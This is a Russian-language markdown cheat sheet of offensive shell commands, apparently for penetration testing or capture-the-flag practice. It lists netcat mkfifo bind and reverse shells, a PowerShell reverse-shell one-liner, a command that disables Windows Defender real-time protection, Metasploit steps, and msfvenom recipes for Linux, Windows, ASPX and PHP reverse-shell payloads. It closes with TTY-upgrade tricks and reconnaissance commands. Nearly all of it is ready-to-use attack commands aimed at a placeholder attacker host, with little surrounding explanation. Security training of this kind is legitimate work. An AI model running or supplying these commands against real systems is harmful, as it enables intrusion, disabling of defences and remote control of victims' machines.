# 📂 Справочник команд по работе с оболочками (Shell)

Этот справочник содержит основные команды для работы с Bind/Reverse Shell, Metasploit, MSFVenom, методами стабилизации TTY и веб-оболочками.

---

## 🛠 Сетевые оболочки (Netcat)

| Команда | Описание |
| :--- | :--- |
| `nc -lvnp <port>` | **Listener**: Запуск прослушивателя на стороне атакующего. |
| `nc -nv <IP> <port>` | **Connect**: Подключение к удаленному порту. |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 0.0.0.0 <port> > /tmp/f` | **Linux Bind Shell**: Привязка bash к порту для входящих соединений. |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc <IP> <port> > /tmp/f` | **Linux Reverse Shell**: Отправка bash на прослушиватель атакующего. |

## 🛡 Windows (PowerShell & Defender)

| Команда                                                                                     | Описание                                                             |
| :------------------------------------------------------------------------------------------ | :------------------------------------------------------------------- |
| `Set-MpPreference -DisableRealtimeMonitoring $true`                                         | Отключение защиты Windows Defender (нужны права админа).             |
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<port>);..."` | **PowerShell Reverse Shell**: Однострочник для обратного соединения. |
| `msiexec /quiet /i <file.msi>`                                                              | Тихая установка/выполнение MSI-пакета.                               |

## 🚀 Metasploit Framework (msfconsole)

| Команда | Описание |
| :--- | :--- |
| `msfconsole -q` | Запуск консоли в "тихом" режиме. |
| `search <name>` | Поиск модулей по ключевому слову. |
| `use <number/path>` | Выбор модуля. |
| `show options` / `show payloads` | Просмотр параметров или доступных нагрузок для модуля. |
| `set RHOSTS <IP>` / `set LHOST <IP>` | Установка параметров цели и атакующего. |
| `exploit` / `run -j` | Запуск эксплойта (флаг `-j` запускает в фоне). |
| `sessions -i <ID>` | Взаимодействие с открытой сессией. |
| `shell` | Переход из Meterpreter в системную оболочку (CMD/Bash). |

## 🐍 MSFVenom (Генерация Payloads)

| Команда | Описание |
| :--- | :--- |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf` | Полезная нагрузка для **Linux (x64)**. |
| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe` | **Meterpreter** для Windows (x64). |
| `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx` | Веб-оболочка ASPX для IIS. |
| `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php` | Реверс-шелл на PHP. |

## 🐚 Стабилизация TTY (TTY Upgrade)

Для превращения "немого" шелла в интерактивный:

1.  `python -c 'import pty; pty.spawn("/bin/bash")'`
2.  `perl -e 'exec "/bin/sh";'`
3.  `lua: os.execute('/bin/sh')`
4.  `find . -exec /bin/sh \; -quit`
5.  `vim -c ':!/bin/sh'`

## 🔍 Полезные утилиты

| Команда | Описание |
| :--- | :--- |
| `ping -c 1 <IP>` | Определение ОС по TTL (128 = Win, 64 = Linux). |
| `nmap -sV -sC -O <IP>` | Сканирование версий, скриптов и определение ОС. |
| `nmap -v <IP> --script banner.nse` | Сбор баннеров сервисов. |
| `sudo -l` | Проверка прав текущего пользователя в sudo. |
| `which python python3 perl` | Проверка установленных интерпретаторов. |
